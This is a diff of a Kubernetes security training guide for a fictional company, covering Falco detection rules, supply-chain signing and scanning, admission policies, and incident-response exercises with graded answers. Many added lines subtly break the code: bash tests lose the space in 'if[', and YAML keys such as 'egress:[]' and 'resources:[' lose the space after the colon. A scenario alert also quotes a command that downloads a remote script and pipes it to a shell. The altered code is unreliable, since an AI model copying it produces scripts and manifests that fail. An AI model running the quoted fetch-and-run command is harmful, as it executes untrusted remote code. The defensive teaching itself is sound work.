          node uses custom AMI without eBPF support
@@ -1846,7 +1840,7 @@ FAILURE 5: Kubernetes metadata enrichment fails
   FIX:
     - Ensure Falco ServiceAccount has RBAC to list/watch pods and namespaces:
       apiGroups: [""]
-      resources: ["pods", "namespaces", "nodes"]
+      resources:["pods", "namespaces", "nodes"]
       verbs: ["get", "list", "watch"]
     - Check: kubectl -n falco logs <falco-pod> | grep -i "k8s\|metadata"
 
@@ -1865,7 +1859,7 @@ FAILURE 6: Rule update causes Falco restart → brief security gap
 
 ### The Threat
 
-```
+```text
 SUPPLY CHAIN ATTACKS target the SOFTWARE BUILD AND DELIVERY PROCESS,
 not the running application:
 
@@ -1897,56 +1891,56 @@ ONE compromised dependency = potential access to production.
 
 ### The Supply Chain Security Stack
 
-```
+```text
 ┌─────────────────────────────────────────────────────────────────┐
-│            SUPPLY CHAIN SECURITY — DEFENSE IN DEPTH              │
-│                                                                  │
-│  LAYER 1: SOURCE CODE                                           │
-│  ┌───────────────────────────────────────────────────────────┐  │
-│  │ • Dependency scanning (Snyk, Dependabot, Renovate)        │  │
-│  │ • Lock files (package-lock.json, go.sum, requirements.txt)│  │
-│  │ • SBOM generation (Syft, cyclonedx)                       │  │
-│  │ • License compliance scanning                              │  │
-│  └───────────────────────────────────────────────────────────┘  │
-│                          │                                       │
-│  LAYER 2: BUILD                                                  │
-│  ┌───────────────────────────────────────────────────────────┐  │
-│  │ • Hardened build environment (ephemeral, minimal)          │  │
-│  │ • Pinned base images (digest, not tag)                     │  │
-│  │ • Build provenance (SLSA framework)                        │  │
-│  │ • Reproducible builds                                      │  │
-│  └───────────────────────────────────────────────────────────┘  │
-│                          │                                       │
-│  LAYER 3: IMAGE                                                  │
-│  ┌───────────────────────────────────────────────────────────┐  │
-│  │ • Vulnerability scanning (Trivy, Grype, Snyk)             │  │
-│  │ • Image signing (Cosign/Sigstore)                          │  │
-│  │ • SBOM attached to image (Syft + Cosign attest)           │  │
-│  │ • Base image freshness (auto-rebuild on base update)       │  │
-│  └───────────────────────────────────────────────────────────┘  │
-│                          │                                       │
-│  LAYER 4: REGISTRY                                               │
-│  ┌───────────────────────────────────────────────────────────┐  │
-│  │ • Private registry (ECR, no public pull in production)     │  │
-│  │ • Immutable tags (ECR image tag immutability)              │  │
-│  │ • Lifecycle policies (clean up untagged images)            │  │
-│  │ • Registry scanning (ECR enhanced scanning)                │  │
-│  └───────────────────────────────────────────────────────────┘  │
-│                          │                                       │
-│  LAYER 5: ADMISSION                                              │
-│  ┌───────────────────────────────────────────────────────────┐  │
-│  │ • Signature verification at admission (Kyverno + Cosign)   │  │
-│  │ • Registry allowlist (Gatekeeper)                          │  │
-│  │ • Vulnerability threshold enforcement                      │  │
-│  │ • SBOM policy enforcement                                  │  │
-│  └───────────────────────────────────────────────────────────┘  │
-│                          │                                       │
-│  LAYER 6: RUNTIME                                                │
-│  ┌───────────────────────────────────────────────────────────┐  │
-│  │ • Container drift detection (Falco Rule 3 from above)      │  │
-│  │ • Behavioral monitoring (expected vs actual syscalls)       │  │
-│  │ • Read-only root filesystem enforcement                    │  │
-│  └───────────────────────────────────────────────────────────┘  │
+│            SUPPLY CHAIN SECURITY — DEFENSE IN DEPTH             │
+│                                                                 │
+│ LAYER 1: SOURCE CODE                                            │
+│ ┌─────────────────────────────────────────────────────────────┐ │
+│ │ • Dependency scanning (Snyk, Dependabot, Renovate)          │ │
+│ │ • Lock files (package-lock.json, go.sum, requirements.txt)  │ │
+│ │ • SBOM generation (Syft, cyclonedx)                         │ │
+│ │ • License compliance scanning                               │ │
+│ └─────────────────────────────────────────────────────────────┘ │
+│                             │                                   │
+│ LAYER 2: BUILD              ▼                                   │
+│ ┌─────────────────────────────────────────────────────────────┐ │
+│ │ • Hardened build environment (ephemeral, minimal)           │ │
+│ │ • Pinned base images (digest, not tag)                      │ │
+│ │ • Build provenance (SLSA framework)                         │ │
+│ │ • Reproducible builds                                       │ │
+│ └─────────────────────────────────────────────────────────────┘ │
+│                             │                                   │
+│ LAYER 3: IMAGE              ▼                                   │
+│ ┌─────────────────────────────────────────────────────────────┐ │
+│ │ • Vulnerability scanning (Trivy, Grype, Snyk)               │ │
+│ │ • Image signing (Cosign/Sigstore)                           │ │
+│ │ • SBOM attached to image (Syft + Cosign attest)             │ │
+│ │ • Base image freshness (auto-rebuild on base update)        │ │
+│ └─────────────────────────────────────────────────────────────┘ │
+│                             │                                   │
+│ LAYER 4: REGISTRY           ▼                                   │
+│ ┌─────────────────────────────────────────────────────────────┐ │
+│ │ • Private registry (ECR, no public pull in production)      │ │
+│ │ • Immutable tags (ECR image tag immutability)               │ │
+│ │ • Lifecycle policies (clean up untagged images)             │ │
+│ │ • Registry scanning (ECR enhanced scanning)                 │ │
+│ └─────────────────────────────────────────────────────────────┘ │
+│                             │                                   │
+│ LAYER 5: ADMISSION          ▼                                   │
+│ ┌─────────────────────────────────────────────────────────────┐ │
+│ │ • Signature verification at admission (Kyverno + Cosign)    │ │
+│ │ • Registry allowlist (Gatekeeper)                           │ │
+│ │ • Vulnerability threshold enforcement                       │ │
+│ │ • SBOM policy enforcement                                   │ │
+│ └─────────────────────────────────────────────────────────────┘ │
+│                             │                                   │
+│ LAYER 6: RUNTIME            ▼                                   │
+│ ┌─────────────────────────────────────────────────────────────┐ │
+│ │ • Container drift detection (Falco Rule 3 from above)       │ │
+│ │ • Behavioral monitoring (expected vs actual syscalls)       │ │
+│ │ • Read-only root filesystem enforcement                     │ │
+│ └─────────────────────────────────────────────────────────────┘ │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
@@ -2080,7 +2074,7 @@ pipeline {
 }
 ```
 
-```
+```text
 TRIVY SCANNING MODES:
   trivy image    → Scan container image (OS packages + language deps)
   trivy fs       → Scan filesystem (source code dependencies)
@@ -2110,7 +2104,7 @@ SCANNING IS NOT ENOUGH:
 
 ### Image Signing — Cosign/Sigstore
 
-```
+```text
 WHY SIGN IMAGES?
 
 Without signing:
@@ -2157,7 +2151,7 @@ COSIGN_EXPERIMENTAL=1 cosign sign \
 # Verifiers check: was this signed by a GitHub Actions workflow from our repo?
 ```
 
-```
+```text
 KEY-BASED vs KEYLESS SIGNING:
 
   Key-based (KMS):
@@ -2254,7 +2248,7 @@ spec:
                       value: "0"
 ```
 
-```
+```text
 mutateDigest: true EXPLAINED:
 
   Without mutateDigest:
@@ -2277,7 +2271,7 @@ mutateDigest: true EXPLAINED:
 
 ### SBOM — Software Bill of Materials
 
-```
+```text
 SBOM = A complete inventory of every component in your software.
 
   Like an ingredient list on food packaging.
@@ -2356,7 +2350,7 @@ resource "aws_ecr_lifecycle_policy" "payment_svc" {
   repository = aws_ecr_repository.payment_svc.name
 
   policy = jsonencode({
-    rules = [
+    rules =[
       {
         rulePriority = 1
         description  = "Keep last 20 tagged images"
@@ -2437,7 +2431,7 @@ resource "aws_ecr_pull_through_cache_rule" "gcr" {
 
 ### SLSA Framework — Build Provenance
 
-```
+```text
 SLSA (Supply-chain Levels for Software Artifacts) — pronounced "salsa"
 
 SLSA defines LEVELS of supply chain security:
@@ -2475,7 +2469,7 @@ stage('Generate Provenance') {
       {
         "_type": "https://in-toto.io/Statement/v0.1",
         "predicateType": "https://slsa.dev/provenance/v0.2",
-        "subject": [
+        "subject":[
           {
             "name": "${ECR_REGISTRY}/${IMAGE_NAME}",
             "digest": {
@@ -2503,7 +2497,7 @@ stage('Generate Provenance') {
               "materials": true
             }
           },
-          "materials": [
+          "materials":[
             {
               "uri": "git+https://bitbucket.org/novamart/payment-svc",
               "digest": { "sha1": "${GIT_COMMIT}" }
@@ -2526,7 +2520,7 @@ stage('Generate Provenance') {
 
 ### Supply Chain Security Failure Modes
 
-```
+```text
 FAILURE 1: Critical CVE in base image — all services affected
   CAUSE: Alpine/Debian/distroless releases security patch,
          but NovaMart images still use old base
@@ -2608,85 +2602,85 @@ FAILURE 6: Cosign signature stored alongside image — registry compromise
 
 ## NovaMart Complete Kubernetes Security Architecture
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│            NOVAMART K8S SECURITY — COMPLETE PICTURE                   │
-│                                                                      │
-│  BEFORE CLUSTER (CI/CD):                                            │
-│  ┌────────────────────────────────────────────────────────────────┐ │
-│  │ Bitbucket → Jenkins Pipeline:                                  │ │
-│  │   1. SonarQube (code quality)                                  │ │
-│  │   2. Snyk (dependency vulnerabilities)                         │ │
-│  │   3. Docker build (multi-stage, non-root, distroless)          │ │
-│  │   4. Trivy scan (image vulnerabilities + secrets + misconfig)  │ │
-│  │   5. SBOM generation (CycloneDX via Trivy/Syft)               │ │
-│  │   6. Push to ECR (immutable tags)                              │ │
-│  │   7. Cosign sign (KMS-backed key)                              │ │
-│  │   8. Cosign attest SBOM + SLSA provenance                     │ │
-│  │   9. Update manifests repo → ArgoCD sync                       │ │
-│  └────────────────────────────────────────────────────────────────┘ │
-│                                                                      │
-│  AT CLUSTER ADMISSION:                                               │
-│  ┌────────────────────────────────────────────────────────────────┐ │
-│  │ API Server Admission Chain:                                    │ │
-│  │                                                                │ │
-│  │ MUTATING:                                                      │ │
-│  │   Istio sidecar injector → adds Envoy                          │ │
-│  │   Vault Agent injector → adds secret sidecar (PCI namespaces) │ │
-│  │   Kyverno → pins image tag to digest (mutateDigest)           │ │
-│  │                                                                │ │
-│  │ VALIDATING:                                                    │ │
-│  │   PSA → enforces baseline/restricted per namespace             │ │
-│  │   Gatekeeper → registry allowlist, resource limits, labels,    │ │
-│  │                 no privileged, no :latest, non-root            │ │
-│  │   Kyverno → image signature verification (Cosign)              │ │
-│  └────────────────────────────────────────────────────────────────┘ │
-│                                                                      │
-│  INSIDE CLUSTER (Runtime):                                           │
-│  ┌────────────────────────────────────────────────────────────────┐ │
-│  │ Falco (DaemonSet):                                             │ │
-│  │   - Shell in container detection                               │ │
-│  │   - Cryptocurrency mining detection                            │ │
-│  │   - Container drift (new executable)                           │ │
-│  │   - Sensitive file access                                      │ │
-│  │   - Reverse shell detection                                    │ │
-│  │   - Unexpected K8s API access                                  │ │
-│  │   - Package manager in production                              │ │
-│  │   → Falcosidekick → Slack + PagerDuty + Loki + auto-response │ │
-│  │                                                                │ │
-│  │ Istio mTLS:                                                    │ │
-│  │   - All pod-to-pod traffic encrypted (STRICT mode)             │ │
-│  │   - AuthorizationPolicy (L7 access control)                    │ │
-│  │                                                                │ │
-│  │ NetworkPolicy:                                                 │ │
-│  │   - Default deny ingress/egress per namespace                  │ │
-│  │   - Explicit allow rules for known communication patterns      │ │
-│  │   - DNS egress allowed (port 53) — common gotcha if missing    │ │
-│  │                                                                │ │
-│  │ RBAC:                                                          │ │
-│  │   - Least privilege per ServiceAccount                         │ │
-│  │   - No cluster-admin for application workloads                 │ │
-│  │   - IRSA for AWS access (no static credentials)                │ │
-│  └────────────────────────────────────────────────────────────────┘ │
-│                                                                      │
-│  MONITORING & AUDIT:                                                 │
-│  ┌────────────────────────────────────────────────────────────────┐ │
-│  │ Gatekeeper metrics → Prometheus → Grafana dashboard            │ │
-│  │ Falco events → Loki → security team queries                    │ │
-│  │ K8s audit log → CloudWatch → alerts on sensitive API calls     │ │
-│  │ ECR scanning → EventBridge → SNS → security team              │ │
-│  │ CloudTrail → S3 → Athena queries for forensics                │ │
-│  │ cert-manager metrics → expiry alerts                           │ │
-│  │ Vault audit log → Loki → who accessed what secret              │ │
-│  └────────────────────────────────────────────────────────────────┘ │
-└─────────────────────────────────────────────────────────────────────┘
+```text
+┌───────────────────────────────────────────────────────────────────────┐
+│               NOVAMART K8S SECURITY — COMPLETE PICTURE                │
+│                                                                       │
+│ BEFORE CLUSTER (CI/CD):                                               │
+│ ┌───────────────────────────────────────────────────────────────────┐ │
+│ │ Bitbucket → Jenkins Pipeline:                                     │ │
+│ │   1. SonarQube (code quality)                                     │ │
+│ │   2. Snyk (dependency vulnerabilities)                            │ │
+│ │   3. Docker build (multi-stage, non-root, distroless)             │ │
+│ │   4. Trivy scan (image vulnerabilities + secrets + misconfig)     │ │
+│ │   5. SBOM generation (CycloneDX via Trivy/Syft)                   │ │
+│ │   6. Push to ECR (immutable tags)                                 │ │
+│ │   7. Cosign sign (KMS-backed key)                                 │ │
+│ │   8. Cosign attest SBOM + SLSA provenance                         │ │
+│ │   9. Update manifests repo → ArgoCD sync                          │ │
+│ └───────────────────────────────────────────────────────────────────┘ │
+│                                                                       │
+│ AT CLUSTER ADMISSION:                                                 │
+│ ┌───────────────────────────────────────────────────────────────────┐ │
+│ │ API Server Admission Chain:                                       │ │
+│ │                                                                   │ │
+│ │ MUTATING:                                                         │ │
+│ │   Istio sidecar injector → adds Envoy                             │ │
+│ │   Vault Agent injector → adds secret sidecar (PCI namespaces)     │ │
+│ │   Kyverno → pins image tag to digest (mutateDigest)               │ │
+│ │                                                                   │ │
+│ │ VALIDATING:                                                       │ │
+│ │   PSA → enforces baseline/restricted per namespace                │ │
+│ │   Gatekeeper → registry allowlist, resource limits, labels,       │ │
+│ │                no privileged, no :latest, non-root                │ │
+│ │   Kyverno → image signature verification (Cosign)                 │ │
+│ └───────────────────────────────────────────────────────────────────┘ │
+│                                                                       │
+│ INSIDE CLUSTER (Runtime):                                             │
+│ ┌───────────────────────────────────────────────────────────────────┐ │
+│ │ Falco (DaemonSet):                                                │ │
+│ │   - Shell in container detection                                  │ │
+│ │   - Cryptocurrency mining detection                               │ │
+│ │   - Container drift (new executable)                              │ │
+│ │   - Sensitive file access                                         │ │
+│ │   - Reverse shell detection                                       │ │
+│ │   - Unexpected K8s API access                                     │ │
+│ │   - Package manager in production                                 │ │
+│ │   → Falcosidekick → Slack + PagerDuty + Loki + auto-response      │ │
+│ │                                                                   │ │
+│ │ Istio mTLS:                                                       │ │
+│ │   - All pod-to-pod traffic encrypted (STRICT mode)                │ │
+│ │   - AuthorizationPolicy (L7 access control)                       │ │
+│ │                                                                   │ │
+│ │ NetworkPolicy:                                                    │ │
+│ │   - Default deny ingress/egress per namespace                     │ │
+│ │   - Explicit allow rules for known communication patterns         │ │
+│ │   - DNS egress allowed (port 53) — common gotcha if missing       │ │
+│ │                                                                   │ │
+│ │ RBAC:                                                             │ │
+│ │   - Least privilege per ServiceAccount                            │ │
+│ │   - No cluster-admin for application workloads                    │ │
+│ │   - IRSA for AWS access (no static credentials)                   │ │
+│ └───────────────────────────────────────────────────────────────────┘ │
+│                                                                       │
+│ MONITORING & AUDIT:                                                   │
+│ ┌───────────────────────────────────────────────────────────────────┐ │
+│ │ Gatekeeper metrics → Prometheus → Grafana dashboard               │ │
+│ │ Falco events → Loki → security team queries                       │ │
+│ │ K8s audit log → CloudWatch → alerts on sensitive API calls        │ │
+│ │ ECR scanning → EventBridge → SNS → security team                  │ │
+│ │ CloudTrail → S3 → Athena queries for forensics                    │ │
+│ │ cert-manager metrics → expiry alerts                              │ │
+│ │ Vault audit log → Loki → who accessed what secret                 │ │
+│ └───────────────────────────────────────────────────────────────────┘ │
+└───────────────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
 ## Quick Reference Card
 
-```
+```text
 ADMISSION CONTROL
 ─────────────────
 Gatekeeper: OPA for K8s. ConstraintTemplate (Rego) + Constraint (params)
@@ -2760,7 +2754,7 @@ Cosign: Image signing + SBOM attestation
 
 **Scenario:** Saturday 3 AM. PagerDuty fires: Falco CRITICAL alert — "Container drift detected" in the `orders` namespace. The alert details:
 
-```
+```text
 DRIFT DETECTED: New executable launched in container
 (process=curl cmdline="curl -s http://45.33.32.156/update.sh | sh"
  exe=/tmp/curl parent=sh
@@ -2953,8 +2947,7 @@ spec:
           not is_exempt(container)
           not container_has_readonly_rootfs(container)
           msg := sprintf(
-            "Container '%s' in pod '%s' must set securityContext.readOnlyRootFilesystem to true. If the container needs writable paths, mount emptyDir volumes at: %v",
-            [container.name, input.review.object.metadata.name, input.parameters.allowedWritablePaths]
+            "Container '%s' in pod '%s' must set securityContext.readOnlyRootFilesystem to true. If the container needs writable paths, mount emptyDir volumes at: %v",[container.name, input.review.object.metadata.name, input.parameters.allowedWritablePaths]
           )
         }
 
@@ -3078,18 +3071,18 @@ spec:
 
 ### 4. Phased Rollout Plan
 
-```
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
-│                   POLICY ROLLOUT: ReadOnlyRootFS                     │
-├──────────┬──────────────┬──────────────────┬────────────────────────┤
-│  PHASE   │  TIMELINE    │  ENFORCEMENT     │  SUCCESS CRITERIA      │
-├──────────┼──────────────┼──────────────────┼────────────────────────┤
-│ Phase 0  │ Day 0        │ (recovery)       │ All teams unblocked    │
-│ Phase 1  │ Day 1-7      │ dryrun           │ Full violation map     │
-│ Phase 2  │ Day 8-14     │ warn             │ <10 violations remain  │
-│ Phase 3  │ Day 15-21    │ deny (staging)   │ 0 staging failures     │
-│ Phase 4  │ Day 22+      │ deny (prod)      │ 0 violations, 0 pages │
-└──────────┴──────────────┴──────────────────┴────────────────────────┘
+│                   POLICY ROLLOUT: ReadOnlyRootFS                    │
+├─────────┬───────────┬──────────────────┬────────────────────────────┤
+│ PHASE   │ TIMELINE  │ ENFORCEMENT      │ SUCCESS CRITERIA           │
+├─────────┼───────────┼──────────────────┼────────────────────────────┤
+│ Phase 0 │ Day 0     │ (recovery)       │ All teams unblocked        │
+│ Phase 1 │ Day 1-7   │ dryrun           │ Full violation map         │
+│ Phase 2 │ Day 8-14  │ warn             │ <10 violations remain      │
+│ Phase 3 │ Day 15-21 │ deny (staging)   │ 0 staging failures         │
+│ Phase 4 │ Day 22+   │ deny (prod)      │ 0 violations, 0 pages      │
+└─────────┴───────────┴──────────────────┴────────────────────────────┘
 ```
 
 **Phase 0 — Emergency Recovery (Day 0, NOW)**
@@ -3225,8 +3218,8 @@ spec:
   policyTypes:
     - Ingress
     - Egress
-  egress: []      # deny all egress
-  ingress: []     # deny all ingress
+  egress:[]      # deny all egress
+  ingress:[]     # deny all ingress
 EOF
 ```
 
@@ -3302,8 +3295,8 @@ spec:
   policyTypes:
     - Ingress
     - Egress
-  egress: []
-  ingress: []
+  egress:[]
+  ingress:[]
 EOF
 
 # The deployment will automatically spin up a replacement pod
@@ -3316,7 +3309,7 @@ EOF
 # "🔴 SECURITY INCIDENT — Active compromise detected in orders namespace.
 #  Compromised pod isolated. Investigation in progress. 
 #  Impact: order-svc temporarily running at reduced capacity.
-#  IC: [Your Name]. Bridge call link: [URL]"
+#  IC: [Your Name]. Bridge call link:[URL]"
 ```
 
 **Minute 9-10: Document and verify containment**
@@ -3419,8 +3412,7 @@ echo "Vulnerable image: $VULN_IMAGE"
 
 # Step 2: Find ALL pods running this exact image across all namespaces
 kubectl get pods -A -o json | jq -r --arg img "$VULN_IMAGE" \
-  '.items[] | select(.spec.containers[]?.image == $img) |
-   [.metadata.namespace, .metadata.name, .status.podIP, .spec.nodeName] | @tsv'
+  '.items[] | select(.spec.containers[]?.image == $img) |[.metadata.namespace, .metadata.name, .status.podIP, .spec.nodeName] | @tsv'
 
 # Step 3: But it's a DESERIALIZATION bug — check if other services
 # use the SAME vulnerable library (not just the same image)
@@ -3626,8 +3618,7 @@ kubectl get pods -A -o json | jq -r --arg digests "$VULN_DIGESTS" '
   .items[] |
   . as $pod |
   .status.containerStatuses[]? |
-  select(.imageID | test($digests)) |
-  [
+  select(.imageID | test($digests)) |[
     $pod.metadata.namespace,
     $pod.metadata.name,
     .name,
@@ -3640,11 +3631,11 @@ kubectl get pods -A -o json | jq -r --arg digests "$VULN_DIGESTS" '
 
 ### 2. Execution Plan — 12 Services, 4-Hour Deadline
 
-```
+```text
 HOUR 0:00                    HOUR 1:00              HOUR 2:00              HOUR 3:00              HOUR 4:00
   │                            │                      │                      │                      │
   ├─── TRIAGE & PARALLEL ─────►├── BUILD + SCAN ─────►├── SIGN + DEPLOY ────►├── VERIFY ───────────►│ DONE
-  │    PREPARATION             │   (parallel)          │   (rolling)          │                      │
+  │    PREPARATION             │   (parallel)         │   (rolling)          │                      │
   │                            │                      │                      │                      │
   ▼                            ▼                      ▼                      ▼                      │
 ```
@@ -3739,7 +3730,7 @@ kubectl get pods -A -o json | jq -r '
 
 **Hour 3:30–4:00 — Communication and Close**
 
-> ✅ `#security-incidents`: "All 12 services patched and deployed. CVE-2024-XXXX remediated. No evidence of exploitation. Post-incident review scheduled for [date]."
+> ✅ `#security-incidents`: "All 12 services patched and deployed. CVE-2024-XXXX remediated. No evidence of exploitation. Post-incident review scheduled for[date]."
 
 Update the CISO with:
 - 12/12 services patched
@@ -3821,11 +3812,11 @@ done
 
 ### 4. Automated CVE-to-Deploy Pipeline
 
-```
-┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
-│  CVE FEED    │───►│  CORRELATOR  │───►│  DECISION    │───►│  REBUILD     │───►│  DEPLOY      │
-│  (Trigger)   │    │  (Match)     │    │  ENGINE      │    │  (Pipeline)  │    │  (Rollout)   │
-└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
+```text
+┌────────────┐    ┌────────────┐    ┌────────────┐    ┌────────────┐    ┌────────────┐
+│ CVE FEED   │───►│ CORRELATOR │───►│ DECISION   │───►│ REBUILD    │───►│ DEPLOY     │
+│ (Trigger)  │    │ (Match)    │    │ ENGINE     │    │ (Pipeline) │    │ (Rollout)  │
+└────────────┘    └────────────┘    └────────────┘    └────────────┘    └────────────┘
 ```
 
 **Architecture:**
@@ -3841,7 +3832,7 @@ Resources:
     Type: AWS::Events::Rule
     Properties:
       EventPattern:
-        source: ["aws.ecr"]
+        source:["aws.ecr"]
         detail-type: ["ECR Image Scan"]
         detail:
           finding-severity-counts:
@@ -3898,7 +3889,7 @@ def cve_response_handler(event):
 
 **Safety Gates:**
 
-```
+```text
 GATE 1: Rebuild
   ├── ✅ Auto: Trigger CI pipeline for each affected service
   ├── ✅ Auto: Trivy scan confirms CVE is resolved in new image
@@ -3916,8 +3907,8 @@ GATE 3: Staging Deploy
 
 GATE 4: Production Deploy (HUMAN GATE for CVSS ≥ 9.0)
   ├── 🧑 Human: Security engineer approves (Slack interactive message)
-  │     "CVE-2024-XXXX patched. 12 services rebuilt. Staging green.
-  │      [APPROVE PROD DEPLOY] [REJECT] [DEFER 1HR]"
+  │    "CVE-2024-XXXX patched. 12 services rebuilt. Staging green.
+  │[APPROVE PROD DEPLOY] [REJECT] [DEFER 1HR]"
   ├── ✅ Auto: Rolling deploy with canary (10% → 50% → 100%)
   ├── ✅ Auto: Error rate monitoring (auto-rollback if error rate > baseline + 1%)
   └── ✅ Auto: Post-deploy ECR scan confirms clean
@@ -4054,7 +4045,7 @@ The attacker named the binary `worker`, `app-helper`, or something equally innoc
 
 Falco's container drift detection works by comparing running executables against the original image contents. Since the cryptominer binary was **baked into the image at build time** (COPY --from=builder), it IS part of the original image. There's no drift — the binary was always there.
 
-```
+```text
 Container Drift Detection:
   Original image contains: java, worker (miner)
   Running processes: java, worker (miner)
@@ -4255,7 +4246,7 @@ fields @timestamp, srcaddr, query_name
     done
     
     # Final gate: if any unpackaged binaries found, require explicit approval
-    if [ -n "$UNPACKAGED_BINARIES" ]; then
+    if[ -n "$UNPACKAGED_BINARIES" ]; then
       echo "🔍 REVIEW REQUIRED: Unpackaged binaries detected:"
       echo "$UNPACKAGED_BINARIES"
       # Post to Slack for security team review
@@ -4347,7 +4338,7 @@ This is the layer that catches it EARLIEST — before anything is even built:
       fi
     done
     
-    if [ "$NEEDS_REVIEW" = true ]; then
+    if[ "$NEEDS_REVIEW" = true ]; then
       # Auto-request review from security team
       # Block merge until approved
       echo "::error::Dockerfile changes require security team review"
@@ -4409,43 +4400,41 @@ spec:
 
 ### Complete Detection Architecture Summary
 
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│                    CRYPTOMINER DETECTION LAYERS                       │
-├─────────┬──────────────────────┬────────────────┬───────────────────┤
-│  LAYER  │  WHAT IT CATCHES     │  DETECTION     │  TIME TO DETECT   │
-│         │                      │  METHOD        │                   │
-├─────────┼──────────────────────┼────────────────┼───────────────────┤
-│ Git PR  │ Suspicious           │ Dockerfile     │ Before build      │
-│ Review  │ Dockerfile changes   │ diff analysis  │ (minutes)         │
-├─────────┼──────────────────────┼────────────────┼───────────────────┤
-│ CI/CD   │ Malware binaries in  │ ClamAV +       │ During build      │
-│ Scan    │ final image          │ VirusTotal +   │ (minutes)         │
-│         │                      │ strings scan   │                   │
-├─────────┼──────────────────────┼────────────────┼───────────────────┤
-│ CI/CD   │ Unexpected new       │ Layer diff     │ During build      │
-│ Diff    │ executables          │ vs previous    │ (minutes)         │
-├─────────┼──────────────────────┼────────────────┼───────────────────┤
-│ Runtime │ Unknown process      │ Falco +        │ Within seconds    │
-│ Process │ execution            │ behavioral     │ of container      │
-│         │                      │ profile        │ start             │
-├─────────┼──────────────────────┼────────────────┼───────────────────┤
-│ Runtime │ Mining protocol      │ Falco network  │ First pool        │
-│ Network │ (Stratum)            │ buffer inspect │ connection        │
-│         │                      │                │ (~seconds)        │
-├─────────┼──────────────────────┼────────────────┼───────────────────┤
-│ Metrics │ Sustained CPU        │ Prometheus     │ 30 min            │
-│ Anomaly │ spike above          │ anomaly alert  │ (by design —      │
-│         │ baseline             │                │ avoid flapping)   │
-├─────────┼──────────────────────┼────────────────┼───────────────────┤
-│ Network │ Connections to       │ DNS monitoring │ First DNS         │
-│ Intel   │ known mining pools   │ + threat intel │ lookup            │
-│         │                      │ IP blocklist   │ (~seconds)        │
-├─────────┼──────────────────────┼────────────────┼───────────────────┤
-│ Cost    │ Unexplained compute  │ AWS Cost       │ Hours to days     │
-│ Anomaly │ cost increase        │ Anomaly        │ (billing delay)   │
-│         │                      │ Detection      │                   │
-└─────────┴──────────────────────┴────────────────┴───────────────────┘
+```text
+┌────────────────────────────────────────────────────────────────────────┐
+│                      CRYPTOMINER DETECTION LAYERS                      │
+├─────────┬────────────────────┬────────────────────┬────────────────────┤
+│ LAYER   │ WHAT IT CATCHES    │ DETECTION METHOD   │ TIME TO DETECT     │
+├─────────┼────────────────────┼────────────────────┼────────────────────┤
+│ Git PR  │ Suspicious         │ Dockerfile         │ Before build       │
+│ Review  │ Dockerfile changes │ diff analysis      │ (minutes)          │
+├─────────┼────────────────────┼────────────────────┼────────────────────┤
+│ CI/CD   │ Malware binaries in│ ClamAV +           │ During build       │
+│ Scan    │ final image        │ VirusTotal +       │ (minutes)          │
+│         │                    │ strings scan       │                    │
+├─────────┼────────────────────┼────────────────────┼────────────────────┤
+│ CI/CD   │ Unexpected new     │ Layer diff         │ During build       │
+│ Diff    │ executables        │ vs previous        │ (minutes)          │
+├─────────┼────────────────────┼────────────────────┼────────────────────┤
+│ Runtime │ Unknown process    │ Falco +            │ Within seconds     │
+│ Process │ execution          │ behavioral         │ of container       │
+│         │                    │ profile            │ start              │
+├─────────┼────────────────────┼────────────────────┼────────────────────┤
+│ Runtime │ Mining protocol    │ Falco network      │ First pool         │
+│ Network │ (Stratum)          │ buffer inspect     │ connection         │
+│         │                    │                    │ (~seconds)         │
+├─────────┼────────────────────┼────────────────────┼────────────────────┤
+│ Metrics │ Sustained CPU      │ Prometheus         │ 30 min             │
+│ Anomaly │ spike above        │ anomaly alert      │ (by design —       │
+│         │ baseline           │                    │ avoid flapping)    │
+├─────────┼────────────────────┼────────────────────┼────────────────────┤
+│ Network │ Connections to     │ DNS monitoring     │ First DNS          │
+│ Intel   │ known mining pools │ + threat intel     │ lookup             │
+│         │                    │ IP blocklist       │ (~seconds)         │
+├─────────┼────────────────────┼────────────────────┼────────────────────┤
+│ Cost    │ Unexplained compute│ AWS Cost           │ Hours to days      │
+│ Anomaly │ cost increase      │ Anomaly Detection  │ (billing delay)    │
+└─────────┴────────────────────┴────────────────────┴────────────────────┘
 ```
 
 **The critical lesson from Q4:** No single layer would have been sufficient. The attacker bypassed CI/CD (legitimate build), admission control (signed image), and basic Falco rules (renamed binary, no drift). The attack specifically exploited the **trust boundaries between layers** — each layer assumed the previous layer had validated the content.
@@ -4504,7 +4493,7 @@ I've reviewed your answers thoroughly. Let me grade each one.
 podSelector:
   matchLabels:
     app: order-svc
-policyTypes: ["Ingress", "Egress"]
+policyTypes:["Ingress", "Egress"]
 # No ingress/egress rules = deny all
 ```
 This cuts network access while keeping the pod running for forensic collection. Smart.
@@ -4598,4 +4587,3 @@ Your security thinking is consistently strong across all four layers. The gaps a
 The Q4 answer was particularly impressive. Understanding WHY each tool fails — not just that it fails — is the mark of someone who won't over-rely on any single security layer. The statement that admission control verifies provenance not behavior, and that this is an architectural limitation not a configuration error, is exactly the right framing.
 
 ---
-
